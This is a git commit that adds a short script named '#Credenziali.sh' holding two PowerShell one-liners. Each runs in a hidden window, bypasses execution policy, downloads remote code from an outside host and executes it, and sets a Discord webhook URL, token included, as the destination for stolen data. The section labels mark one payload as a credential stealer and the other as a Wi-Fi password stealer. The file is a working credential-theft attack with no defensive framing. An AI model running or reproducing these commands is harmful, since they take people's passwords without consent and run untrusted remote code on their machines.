cdbd2ea6f5c716030d6cce351f819c9961933069
Davide Pirelli <info@inkstudio.it>
2025-01-24 15:47:09 +0100

    Create #Credenziali.sh

---
+++ #Credenziali.sh
@@ -0,0 +1,6 @@
+#Credenziali
+powershell -w h -ep bypass $dc='https://discord.com/api/webhooks/1200442961339625512/YqZgOng7oZaBJINvUKpMqQASvmowYmzcJYjbf9Y5P1Vp-MLV8PBRwN9zWydxdPpYk2a1';$db='';irm https://jakoby.lol/35k | iex
+
+
+#WifiCred
+powershell -w h -NoP -Ep Bypass $dc='https://discord.com/api/webhooks/1200442961339625512/YqZgOng7oZaBJINvUKpMqQASvmowYmzcJYjbf9Y5P1Vp-MLV8PBRwN9zWydxdPpYk2a1';$db='';irm jakoby.lol/e8v | iex
